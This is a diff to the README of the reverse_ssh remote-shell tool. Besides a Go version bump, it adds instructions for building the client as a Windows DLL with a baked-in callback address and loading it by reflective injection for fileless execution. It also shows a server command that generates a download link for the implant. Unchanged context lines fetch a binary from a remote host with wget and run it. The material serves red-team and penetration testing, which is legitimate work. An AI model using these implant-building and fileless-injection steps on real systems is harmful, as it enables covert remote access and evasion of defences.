@@ -77,7 +77,7 @@ ssh -J localhost:3232 root.wombo
 
 ## Setup Instructions
 
-> **NOTE:** reverse_ssh requires Go **1.16** or higher. Please check you have at least this version via `go version`
+> **NOTE:** reverse_ssh requires Go **1.17** or higher. Please check you have at least this version via `go version`
 
 The simplest build command is just:
 
@@ -196,7 +196,29 @@ wget http://192.168.122.1:1234/test
 chmod +x test
 ./test
 ```
+### Windows DLL Generation 
 
+You can compile the client as a DLL to be loaded with something like [Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1). 
+This will need a cross compiler if you are doing this on linux, I used `mingw-w64-gcc` from the the archlinux main repo.
+
+```bash
+CC=x86_64-w64-mingw32-gcc GOOS=windows RSSH_HOMESERVER=192.168.1.1:2343 make client_dll
+```
+
+This can also be compile when the server has webserver support enabled. 
+
+```
+# Homeserver_address sets the default baked in call back for the client
+./server --homeserver_address 192.168.122.1:1234 --enable_webserver :1234
+
+# Generate an unnamed link
+ssh 192.168.122.1 -p 1234
+
+catcher$ link --name windows_dll --shared-object --goos windows
+http://192.168.122.1:1234/windows_dll
+```
+
+Which is useful when you want to do fileless injection of the rssh client. 
 
 ### Full Windows Shell Support
 
